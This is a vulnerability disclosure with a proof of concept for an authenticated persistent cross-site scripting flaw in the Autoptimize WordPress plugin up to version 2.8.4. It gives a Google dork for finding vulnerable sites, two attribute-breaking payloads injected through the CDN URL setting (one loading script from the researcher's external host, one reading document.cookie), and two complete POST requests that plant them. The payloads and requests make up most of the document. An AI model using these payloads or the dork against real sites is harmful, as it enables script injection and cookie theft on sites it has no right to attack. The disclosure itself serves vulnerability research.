/*!
- # VULNERABILITY: Autoptimize WordPress Plugin <= 2.8.4 - Authenticated Persistent XSS
- # GOOGLE DORK: inurl:/wp-content/plugins/autoptimize/
- # DATE: 2021-05-09
- # SECURITY RESEARCHER: m0ze [ https://m0ze.ru ]
- # VENDOR: Frank Goossens [ https://autoptimize.com ]
- # SOFTWARE VERSION: <= 2.8.4
- # SOFTWARE LINK: https://wordpress.org/plugins/autoptimize/
- # CVSS: 3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:L/A:N
- # CWE: CWE-79
- # CVE: N/A
*/



### -- [ Info: ]

[i] An Authenticated Persistent XSS vulnerability was discovered in the Autoptimize plugin through v2.8.4 for WordPress.

[i] Vulnerable parameter(s): &autoptimize_cdn_url=.



### -- [ Impact: ]

[~] Malicious JavaScript code injections, the ability to combine attack vectors against the targeted system, which can lead to a complete compromise of the resource.



### -- [ Payloads: ]

[$] https://m0ze.ru/payload/a.js' onload=alert(origin); m0ze='

[$] https://example.com/wp-includes/css/dist/block-library/style.min.css' onload=alert(document.cookie); m0ze='



### -- [ PoC #1 | Authenticated Persistent XSS | JS, CSS  & HTML > CDN Base URL: ]

[!] POST /wp-admin/options.php HTTP/2
Host: example.com
Cookie: [admin cookies]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 672

option_page=autoptimize&action=update&_wpnonce=cfc167cffb&_wp_http_referer=%2Fwp-admin%2Foptions-general.php%3Fpage%3Dautoptimize%26settings-updated%3Dtrue&autoptimize_enable_site_config=on&autoptimize_js=on&autoptimize_js_include_inline=on&autoptimize_js_forcehead=on&autoptimize_js_exclude=&autoptimize_js_trycatch=on&autoptimize_css_defer=on&autoptimize_css_defer_inline=&autoptimize_css_exclude=&autoptimize_cdn_url=https%3A%2F%2Fm0ze.ru%2Fpayload%2Fa.js%27+onload%3Dalert%28origin%29%3B+m0ze%3D%27&autoptimize_cache_nogzip=on&autoptimize_minify_excluded=on&autoptimize_cache_fallback=on&autoptimize_optimize_logged=on&autoptimize_cache_clean=Save+Changes+and+Empty+Cache



### -- [ PoC #2 | Authenticated Persistent XSS | JS, CSS  & HTML > CDN Base URL: ]

[!] POST /wp-admin/options.php HTTP/2
Host: example.com
Cookie: [admin cookies]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 726

option_page=autoptimize&action=update&_wpnonce=cfc167cffb&_wp_http_referer=%2Fwp-admin%2Foptions-general.php%3Fpage%3Dautoptimize%26settings-updated%3Dtrue&autoptimize_enable_site_config=on&autoptimize_js=on&autoptimize_js_include_inline=on&autoptimize_js_forcehead=on&autoptimize_js_exclude=&autoptimize_js_trycatch=on&autoptimize_css_defer=on&autoptimize_css_defer_inline=&autoptimize_css_exclude=&autoptimize_cdn_url=https%3A%2F%2Fexample.com%2Fwp-includes%2Fcss%2Fdist%2Fblock-library%2Fstyle.min.css%27+onload%3Dalert%28document.cookie%29%3B+m0ze%3D%27&autoptimize_cache_nogzip=on&autoptimize_minify_excluded=on&autoptimize_cache_fallback=on&autoptimize_optimize_logged=on&autoptimize_cache_clean=Save+Changes+and+Empty+Cache



### -- [ Contacts: ]

[+] Website: m0ze.ru
[+] GitHub: @m0ze
[+] Telegram: @m0ze_ru
[+] Twitter: @vladm0ze
